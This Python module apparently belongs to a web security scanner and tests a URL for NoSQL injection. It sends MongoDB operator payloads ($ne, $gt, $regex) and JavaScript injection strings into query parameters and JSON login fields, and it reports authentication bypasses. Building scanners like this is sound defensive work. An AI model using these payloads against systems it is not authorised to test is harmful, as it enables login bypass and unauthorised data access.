from typing import Any, Dict, List, Optional
import requests
import json
import urllib.parse
import time
import logging
from websecure.core.payloads import load_external_payloads

logger = logging.getLogger(__name__)

# Payloads for NoSQL Injection
# Focus on MongoDB mostly as it's the most common target
NOSQL_PAYLOADS = [
    # Auth bypass / Tautologies
    ({"$ne": -1}, "ne_bypass"),
    ({"$ne": 1}, "ne_bypass"),
    ({"$gt": ""}, "gt_bypass"),
    ({"$regex": ".*"}, "regex_bypass"),
]

# Error-based / Specific logic payloads (URL encoded)
URL_PAYLOADS = [
    ("'", "syntax_error"),
    ('"', "syntax_error"),
    ("|| 1==1", "logic_bypass"),
    ("' && this.password.match(/.*/)//", "js_injection"), 
    ("%27%20%26%26%20this.password.match(/.*/)//", "js_injection_encoded"),
]

# Load Custom Payloads
try:
    _custom = load_external_payloads('nosqli')
    for _p in _custom:
        _p = _p.strip()
        if not _p: continue
        # Heuristic: JSON-like -> Body payload
        if _p.startswith('{') and _p.endswith('}'):
            try:
                _j = json.loads(_p)
                NOSQL_PAYLOADS.append((_j, "custom_body"))
            except:
                NOSQL_PAYLOADS.append((_p, "custom_body"))
        else:
            URL_PAYLOADS.append((_p, "custom_param"))
except Exception as e:
    logger.debug(f"Failed to load custom nosqli payloads: {e}")

def run(url: str, session=None, debug: bool = False, auth_ctx=None) -> List[Dict[str, Any]]:
    """
    Checks for NoSQL Injection vulnerabilities by fuzzing URL parameters and JSON bodies.
    """
    results = []
    if not session:
        session = requests.Session()

    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query)

    # 1. GET Parameter Fuzzing
    # If the URL has query parameters, we fuzz them one by one.
    if qs:
        try:
            _fuzz_query_params(url, qs, session, results)
        except Exception as e:
            logger.debug(f"NoSQLi GET error {url}: {e}")

    # 2. JSON Body Fuzzing
    # We attempt to send JSON payloads assuming the endpoint might accept POST with JSON.
    try:
        _fuzz_json_body(url, session, results)
    except Exception as e:
        logger.debug(f"NoSQLi JSON error {url}: {e}")

    return results

def _fuzz_query_params(url: str, qs: dict, session, results: list):
    """
    Fuzzes GET parameters with NoSQL logic operators.
    Note: Standard requests library URL encoding usually prevents passing raw dicts like ?arg[$ne]=1
    unless we construct the query manually strictly.
    """
    base_url = url.split("?")[0]
    
    # We verify vulnerability by checking for differences in response length/code 
    # or specific error messages.
    
    # First, baseline
    try:
        base_resp = session.get(url, timeout=5)
    except requests.RequestException:
        return

    # Basic error probing
    for payload_str, pay_type in URL_PAYLOADS:
        # Inject into each param
        for param in qs:
            # We must be careful to reconstruct the query with the injection
            # Simply appending payload to the value
            
            # Construct dictionary
            fuzzed_qs = qs.copy()
            # If multivalued, take first and append
            val = fuzzed_qs[param][0]
            fuzzed_qs[param] = val + payload_str
            
            try:
                # Re-encode
                new_query = urllib.parse.urlencode(fuzzed_qs, doseq=True)
                target = f"{base_url}?{new_query}"
                
                resp = session.get(target, timeout=5)
                
                if _is_suspicious(base_resp, resp):
                    results.append({
                        "type": "nosqli",
                        "severity": "medium",
                        "url": target,
                        "method": "GET",
                        "message": f"Potential NoSQL Injection (Error/diff): {pay_type}",
                        "payload": payload_str,
                        "evidence": {
                            "request_url": target,
                            "response_status": resp.status_code,
                            "response_snippet": resp.text[:500] if resp.text else ""
                        },
                        "details": f"Parameter '{param}' with payload '{payload_str}' caused anomalous response."
                    })
            except:
                pass


def _fuzz_json_body(url: str, session, results: list):
    """
    Fuzzes endpoint assuming it accepts JSON POST.
    """
    # Baseline
    try:
        base_payload = {"user": "user", "password": "password"}
        base_resp = session.post(url, json=base_payload, timeout=5)
        if base_resp.status_code in (404, 405):
            return
    except:
        return

    # Operator Injection (MongoDB $ne, $gt, etc)
    for payload_obj, pay_type in NOSQL_PAYLOADS:
        # Try injecting into 'user' and 'password' common fields
        targets = ["username", "user", "email", "password", "pass", "id"]
        
        for key in targets:
            attack_payload = base_payload.copy()
            attack_payload[key] = payload_obj
            
            try:
                resp = session.post(url, json=attack_payload, timeout=5)
                
                # Heuristic:
                # If baseline was 401/403 (login failed) and this is 200 (bypass)
                # Or if response is significantly different (diff > threshold)
                
                if base_resp.status_code in (401, 403) and resp.status_code == 200:
                    results.append({
                        "type": "nosqli",
                        "severity": "critical",
                        "url": url,
                        "method": "POST",
                        "message": f"NoSQL Authorization Bypass detected via {pay_type}",
                        "payload": json.dumps(payload_obj),
                        "evidence": {
                            "request_body": json.dumps(attack_payload),
                            "response_status": resp.status_code,
                            "response_snippet": resp.text[:500] if resp.text else ""
                        },
                        "details": f"Injected '{json.dumps(payload_obj)}' into '{key}' and got 200 OK."
                    })
                elif _is_suspicious(base_resp, resp):
                     results.append({
                        "type": "nosqli",
                        "severity": "medium",
                        "url": url,
                        "method": "POST",
                        "message": f"Potential NoSQL Injection Behavior ({pay_type})",
                        "payload": json.dumps(payload_obj),
                        "evidence": {
                            "request_body": json.dumps(attack_payload),
                            "response_status": resp.status_code,
                            "response_snippet": resp.text[:500] if resp.text else ""
                        },
                        "details": f"Injected '{json.dumps(payload_obj)}' into '{key}' caused response anomaly."
                    })
            except:
                pass

def _is_suspicious(base_resp, attack_resp) -> bool:
    """
    Checks if the attack response differs interestingly from the base response.
    """
    # 1. Error messages
    errors = ["MongoError", "bad syntax", "unterminated string", "unexpected token"]
    for e in errors:
        if e.lower() in attack_resp.text.lower():
            if e.lower() not in base_resp.text.lower():
                return True

    # 2. Status code change (excluding standard 400/422 invalid input)
    # If base was 200 and attack is 500 -> suspicious
    if base_resp.status_code == 200 and attack_resp.status_code == 500:
        return True

    # 3. Content Length diff > 50% (ignoring error pages somewhat)
    len_base = len(base_resp.content)
    len_attack = len(attack_resp.content)
    
    if len_base > 0:
        ratio = abs(len_base - len_attack) / len_base
        if ratio > 0.5 and attack_resp.status_code == 200:
            return True
            
    return False
